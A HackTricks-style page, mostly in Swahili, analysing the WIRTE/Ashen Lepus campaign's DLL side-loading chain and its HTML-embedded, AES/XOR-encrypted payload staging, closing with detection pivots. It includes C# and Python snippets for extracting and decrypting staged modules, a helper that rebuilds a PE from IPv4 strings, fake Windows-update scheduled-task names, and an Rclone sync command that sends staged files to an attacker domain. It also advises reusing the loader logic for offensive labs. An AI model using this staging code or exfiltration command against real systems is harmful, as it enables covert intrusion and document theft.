# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) ilifanya weaponized pattern inayorudiwa ambayo inaunganisha DLL sideloading, staged HTML payloads, na modular .NET backdoors ili kudumu ndani ya Middle Eastern diplomatic networks. Technique hii inaweza kutumika tena na operator yeyote kwa sababu inategemea:

- **Archive-based social engineering**: PDFs zisizo na madhara huamuru targets kuvuta RAR archive kutoka kwenye file-sharing site. Archive hiyo hujumuisha real-looking document viewer EXE, malicious DLL iliyotajwa kwa jina la trusted library (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na decoy `Document.pdf`.
- **DLL search order abuse**: victim hufanya double-click kwenye EXE, Windows hutatua DLL import kutoka current directory, na malicious loader (AshenLoader) hu-execute ndani ya trusted process huku decoy PDF ikifunguka ili kuondoa suspicion.
- **Living-off-the-land staging**: kila later stage (AshenStager → AshenOrchestrator → modules) huwekwa off disk mpaka ihitajike, ikiletwa kama encrypted blobs zilizofichwa ndani ya HTML responses ambazo vinginevyo hazina madhara.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE side-loads AshenLoader, ambayo hufanya host recon, AES-CTR hui-encrypt, na kuipost ndani ya rotating parameters kama `token=`, `id=`, `q=`, au `auth=` kwenda paths zinazoonekana kama API (e.g., `/api/v2/account`).
2. **HTML extraction**: C2 inafichua next stage tu wakati client IP inageolocate hadi target region na `User-Agent` inalingana na implant, hivyo frustrating sandboxes. Checks zikipita HTTP body huwa na `<headerp>...</headerp>` blob yenye Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager ina-deploywa pamoja na another legitimate binary ambayo ina-import `wtsapi32.dll`. Malicious copy iliyodungwa ndani ya binary hufetch HTML zaidi, wakati huu ikichonga `<article>...</article>` ili kurecover AshenOrchestrator.
4. **AshenOrchestrator**: modular .NET controller ambayo hu-decode Base64 JSON config. Fields za config `tg` na `au` huunganishwa/huhashiwa kuwa AES key, ambayo hu-decrypt `xrk`. Bytes zinazotokana hutenda kama XOR key kwa kila module blob inayofetched baadaye.
5. **Module delivery**: kila module hufafanuliwa kupitia HTML comments ambazo hu-redirect parser kwenda arbitrary tag, kuvunja static rules zinazotazama tu `<headerp>` au `<article>`. Modules hujumuisha persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Hata kama watetezi watazuia au kuondoa kipengele mahususi, mwendeshaji anahitaji tu kubadilisha tag iliyopendekezwa kwenye HTML comment ili kuendelea na uwasilishaji.

### Quick Extraction Helper (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Utafiti wa hivi karibuni wa HTML smuggling (Talos) unaonyesha payloads zilizofichwa kama Base64 strings ndani ya `<script>` blocks kwenye HTML attachments na kufutwa kwa JavaScript wakati wa runtime. Hila hiyo hiyo inaweza kutumika tena kwa majibu ya C2: stage encrypted blobs ndani ya script tag (au DOM element nyingine) na kuzidecode in-memory kabla ya AES/XOR, hivyo kufanya ukurasa uonekane kama HTML ya kawaida. Talos pia inaonyesha layered obfuscation (kubadilisha majina ya identifiers pamoja na Base64/Caesar/AES) ndani ya script tags, jambo linalolingana vizuri na HTML-staged C2 blobs. Uandishi wa baadaye wa Talos kuhusu **hidden text salting** pia ni muhimu hapa: kugawa Base64 kwa kutumia HTML comments au whitespace zisizo na maana kunatosha kuvunja regex extractors rahisi huku reconstruction ya upande wa browser ikiwa rahisi sana.

## Recent Variant Notes (2024-2025)

- Check Point iliona kampeni za WIRTE mwaka 2024 ambazo bado zilitegemea archive-based sideloading lakini zilitumia `propsys.dll` (stagerx64) kama stage ya kwanza. Stager husdecode payload inayofuata kwa Base64 + XOR (key `53`), hutuma HTTP requests zenye `User-Agent` iliyowekwa moja kwa moja, na huchota encrypted blobs zilizopachikwa kati ya HTML tags. Katika tawi moja, stage ilijengwa upya kutoka kwenye orodha ndefu ya embedded IP strings zilizofutwa kwa `RtlIpv4StringToAddressA`, kisha kuunganishwa kuwa payload bytes.
- OWN-CERT iliandika tooling ya awali ya WIRTE ambapo dropper ya `wtsapi32.dll` iliyosideloadiwa ililinda strings kwa Base64 + TEA na kutumia jina la DLL lenyewe kama decryption key, kisha ikaXOR/Base64-obfuscate data ya utambuzi wa host kabla ya kuituma kwa C2.

## Reconstructing IP-Encoded Stages

Tawi la WIRTE la 2024 `propsys.dll` linaonyesha kwamba PE inayofuata haihitaji kuwepo kama HTML blob moja inayoshikamana. Loader inaweza kuhifadhi stage bytes kama dotted-quad strings na kuzijenga upya kwa `RtlIpv4StringToAddressA`, mtindo unaohusiana kwa karibu na **IPfuscation** tradecraft ya Hive. Kiutendaji hili ni muhimu wakati actor anataka ukurasa wa HTML uwe na kinachoonekana kama IOC zisizo na madhara au config data badala ya payload ya wazi ya Base64.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
If the recovered bytes begin with `MZ`, you likely reconstructed the next PE directly. If not, check for a leading XOR/Base64 layer or small delimiter chunks between addresses.

## Majina Yanayoweza Kubadilishwa ya DLL & Mzunguko wa Host

Sifa muhimu ya muundo huu ni kwamba **HTML/AES/XOR staging backend inaweza kubaki ile ile wakati tu jozi ya sideload inabadilika**. WIRTE ilizungusha kupitia `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`, na `propsys.dll` katika kampeni tofauti, jambo ambalo ni muhimu kwa sababu:

- `propsys.dll` na `wtsapi32.dll` ni majina ya DLL ya Windows yasiyovutia ambayo watetezi wanatarajia yapo kwenye `%System32%` / `%SysWOW64%`.
- Katalogi za umma kama **HijackLibs** tayari zinaonyesha binaries nyingi ambazo zitapakia majina hayo ya DLL kutoka saraka ya programu iliyonakiliwa, hivyo kuwapa waendeshaji host mbadala bila kubuni upya stager.
- Ni surface ya export pekee inayopaswa kurekebishwa kwa kila host. HTML parser, AES/XOR routines, na module loader kwa kawaida vinaweza kuhamishwa bila mabadiliko ndani ya forwarding proxy DLL.

Kwa kazi ya maabara ya offensive, hii inamaanisha unaweza kugawa tatizo kuwa **(1) pata host thabiti iliyosainiwa inayosuluhisha jina lako la DLL uliolichagua ndani ya mfumo** na **(2) tumia tena logic ile ile ya staged-HTML loader nyuma ya DLL hiyo**.

## Uimarishaji wa Crypto & C2

- **AES-CTR kila mahali**: loaders za sasa hujumuisha funguo za 256-bit pamoja na nonces (mfano, `{9a 20 51 98 ...}`) na kwa hiari huongeza layer ya XOR kwa kutumia strings kama `msasn1.dll` kabla/baada ya decryption.
- **Tofauti za key material**: loaders za awali zilitumia Base64 + TEA kulinda strings zilizoembedwa, huku decryption key ikitokana na jina la DLL hasidi (mfano, `wtsapi32.dll`).
- **Mgawanyo wa infrastructure + kuficha kwa subdomain**: staging servers hutenganishwa kwa kila tool, hupangishwa kwenye ASN tofauti, na wakati mwingine huwekwa mbele na subdomains zinazoonekana halali, hivyo kuchoma stage moja hakufichui zingine.
- **Kusafirisha recon kwa siri**: data iliyoorodheshwa sasa inajumuisha listings za Program Files ili kugundua apps za thamani kubwa na huwa imefichwa kwa encryption kabla haijatoka kwenye host.
- **URI churn**: query parameters na REST paths hubadilika kati ya kampeni (`/api/v1/account?token=` → `/api/v2/account?auth=`), hivyo kuondoa detections dhaifu.
- **User-Agent pinning + safe redirects**: C2 infrastructure hujibu tu kwa strings halisi za UA na vinginevyo hu-redirect kwenda news/health sites zisizo na madhara ili kuchanganyika na mazingira.
- **Uwasilishaji uliolindwa**: servers zina geo-fenced na hujibu tu implants halisi. Clients ambao hawajaidhinishwa hupokea HTML isiyo ya kushuku.

## Persistence & Execution Loop

AshenStager huacha scheduled tasks ambazo hujifanya kuwa Windows maintenance jobs na hutekelezwa kupitia `svchost.exe`, kwa mfano:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Tasks hizi huzindua upya mnyororo wa sideloading wakati wa boot au kwa vipindi fulani, kuhakikisha AshenOrchestrator inaweza kuomba modules mpya bila kugusa disk tena.

## Kutumia Benign Sync Clients kwa Exfiltration

Waendeshaji huweka hati za kidiplomasia ndani ya `C:\Users\Public` (inaweza kusomwa na wote na si ya kushuku) kupitia module maalum, kisha hupakua binary halali ya [Rclone](https://rclone.org/) ili kusawazisha saraka hiyo na hifadhi ya mshambuliaji. Unit42 inaeleza kuwa hii ni mara ya kwanza mtendaji huyu kuonekana akitumia Rclone kwa exfiltration, ikiendana na mwelekeo mpana wa kutumia zana halali za sync ili kuchanganyika na traffic ya kawaida:

1. **Stage**: nakili/kunja files lengwa ndani ya `C:\Users\Public\{campaign}\`.
2. **Configure**: tuma config ya Rclone inayoelekeza kwenye HTTPS endpoint inayodhibitiwa na mshambuliaji (mfano, `api.technology-system[.]com`).
3. **Sync**: endesha `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ili traffic ifanane na cloud backups za kawaida.

Kwa kuwa Rclone hutumiwa sana kwa workflows halali za backup, watetezi wanapaswa kuzingatia executions zisizo za kawaida (binaries mpya, remotes zisizo za kawaida, au kusawazisha ghafla kwa `C:\Users\Public`).

## Detection Pivots

- Toa alert kwenye **signed processes** ambazo ghafla zinapakia DLL kutoka njia zinazoandikwa na user (Procmon filters + `Get-ProcessMitigation -Module`), hasa majina ya DLL yanapolingana na `netutils`, `srvcli`, `dwampi`, `wtsapi32`, au `propsys`.
- Chunguza HTTPS responses zinazoshukiwa kwa **large Base64 blobs zilizoembedwa ndani ya tags zisizo za kawaida** au zilizoandaliwa na comments `<!-- TAG: <xyz> -->`.
- Normalize HTML kwanza: **ondoa comments na punguza whitespace kabla ya Base64 extraction**, kwa sababu hidden-text-salting style evasion inaweza kugawa payloads kati ya boundaries za comments.
- Panua utafutaji wa HTML hadi **Base64 strings ndani ya `<script>` blocks** (HTML smuggling-style staging) ambazo hufunuliwa kupitia JavaScript kabla ya AES/XOR processing.
- Tafuta calls za kurudiarudia kwa **`RtlIpv4StringToAddressA` ikifuatiwa na buffer assembly**, hasa wakati strings zinazozunguka ni orodha ndefu za IPv4 badala ya network targets halisi.
- Tafuta **scheduled tasks** zinazoendesha `svchost.exe` zikiwa na arguments zisizo za service au zinazoelekeza tena kwenye directories za dropper.
- Fuatilia **C2 redirects** ambazo hurejesha payloads tu kwa exact `User-Agent` strings na vinginevyo huruka kwenda legitimate news/health domains.
- Fuatilia binaries za **Rclone** zinazoonekana nje ya maeneo yanayosimamiwa na IT, `rclone.conf` mpya, au sync jobs zinazovuta kutoka staging directories kama `C:\Users\Public`.

## Marejeo

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
